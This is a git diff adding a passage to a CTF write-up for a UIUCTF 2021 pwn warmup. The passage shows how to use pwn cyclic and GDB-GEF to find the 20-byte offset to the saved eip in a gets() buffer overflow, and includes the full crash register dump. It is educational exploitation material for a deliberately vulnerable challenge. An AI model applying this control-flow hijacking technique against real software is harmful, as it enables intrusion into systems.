@@ -59,10 +59,69 @@ OK. So the program is using an insecure function. Why is `gets()` insecure? Acco
 
 `buf` is the area we write to, and the saved ebp and saved eip are the places where the program has saved registers for when the program returns to the function from which it was called. If we overwrite it with an address, we can control where the program jumps to after the `vulnerable()` function is done. Luckily for us, the program has provided us with a `give_flag` function that prints out the flag. So our goal is to overwrite the saved eip with the address of give_flag.
 
+Hold up. How did we know how much space in memory there is between `buf` and the saved ebp and eip? Although there are ways to do this in many cases through static analysis, I prefer to use a tool such as GDB to examine the memory as the program runs. I used the GEF extension of GDB (found at https://gef.readthedocs.io/en/master/) to do this. A quick way to find the distance from `buf` to the ebp and eip is to use `pwn cyclic`, which comes with pwntools, to allow for easy analysis through GDB. We can run the command `pwn cyclic 100 -n 4` (note that the -n 4 is because our program is 32-bit, and 4 bytes is 32 bits) to generate a cyclic pattern. The reason we use this cyclic pattern is that if we examine the registers in GDB afterwards, we could determine the offset from the buffer to the registers because each 4-byte section of the cyclic pattern is unique and can be looked up using the `pwn cyclic` program. Let's do this now:
+
+```bash
+$ pwn cyclic 100 -n 4
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+```
+
+We can now paste this into GDB-GEF, which will automatically print the registers when our program segfaults:
+
+```bash
+gef➤  r
+Starting program: /mnt/c/users/ethan/downloads/CTF-Writeups/UIUCTF 2021/Pwn_Warmup/challenge
+This is SIGPwny stack3, go
+&give_flag = 0x80485ab
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616166 in ?? ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd128  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
+$ebx   : 0x0
+$ecx   : 0xf7fb2580  →  0xfbad208b
+$edx   : 0xffffd18c  →  0xf7fb2000  →  0x001e6d6c
+$esp   : 0xffffd140  →  "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
+$ebp   : 0x61616165 ("eaaa"?)
+$esi   : 0xf7fb2000  →  0x001e6d6c
+$edi   : 0xf7fb2000  →  0x001e6d6c
+$eip   : 0x61616166 ("faaa"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
+───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd140│+0x0000: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"    ← $esp
+0xffffd144│+0x0004: "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"
+0xffffd148│+0x0008: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
+0xffffd14c│+0x000c: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
+0xffffd150│+0x0010: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
+0xffffd154│+0x0014: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
+0xffffd158│+0x0018: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
+0xffffd15c│+0x001c: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
+─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x61616166
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge", stopped 0x61616166 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+```
+
+There's a lot of information here, but what's important is that we see that eip has been changed to 0x61616166. We can use `pwn cyclic` to look up the offset:
+
+```bash
+$ pwn cyclic -l 0x61616166 -n 4
+20
+```
+
+So there! The offset to the saved eip is 20, and we find that the offset to the saved ebp is 16 by the same process. 
+
 **Sidenote: What are ebp and eip and why are they saved on the stack (memory) right now?**
 The CPU of a computer has multiple registers, each able to hold a value. In a 32-bit program, the registers each hold 4 bytes (32 bits). The ebp register stores the base address of the stack while the eip register stores the address of the current instruction the program is executing. When a program calls a function, it must store where to return to after the function is called. So, when a function is called ebp and eip are stored on the stack, and are returned to the registers when `ret` is called. So, if we overwrite the saved eip, we can hijack the control flow of the program because we are changing where the program jumps to after the function is finished.
 
-How do we do this? Let's examine memory again.
+OK, back to our exploitation. How do we overwrite eip? Let's examine memory again.
 
 Let's say we input `AAAAAAAA` into the program. Then the program writes the input to `buf`:
 
